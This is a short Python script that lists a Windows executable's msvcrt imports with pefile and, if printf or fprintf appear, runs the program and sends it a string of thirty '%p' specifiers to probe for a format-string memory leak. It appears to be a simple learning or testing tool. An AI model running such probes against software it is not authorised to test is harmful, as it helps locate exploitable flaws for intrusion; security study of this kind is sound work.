import sys, os, subprocess, pefile

target_path = ''

def validatePath():
    global target_path

    if len(sys.argv) < 2:
        print("please provide a target file")
        sys.exit(1)

    target_path = sys.argv[1]

    if not os.path.exists(target_path) or not os.path.isfile(target_path):
        print("Target file not found")
        sys.exit(1)

    print("Target located")

def changeWorkingDir():
    pe_dir = os.path.dirname(target_path)
    os.chdir(pe_dir)

def stringFormatAttack():
    print("Attempting string format attack")
    
    process = subprocess.Popen(f"\"{target_path}\"", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    input_str = " ".join(["%p"] * 30) + "\n"
    output, error = process.communicate(input=input_str.encode())
    
    print(output)
    if error:
        print(error)


def staticAnalysis():
    print("Analysing PE Imports")

    pe = pefile.PE(target_path)
    has_printf = False

    for entry in pe.DIRECTORY_ENTRY_IMPORT:
        if entry.dll.decode('utf-8').lower() == 'msvcrt.dll':
            print(f"{entry.dll.decode('utf-8')}:")
            for imp in entry.imports:
                func_name = imp.name.decode('utf-8') if imp.name else str(imp.ordinal)
                print(f"\t{func_name}")
                if func_name == 'printf' or func_name == 'fprintf':
                    has_printf = True
    
    if has_printf:
        stringFormatAttack()
    else:
        print("No printf or fprintf found in imports.")

validatePath()
changeWorkingDir()
staticAnalysis()
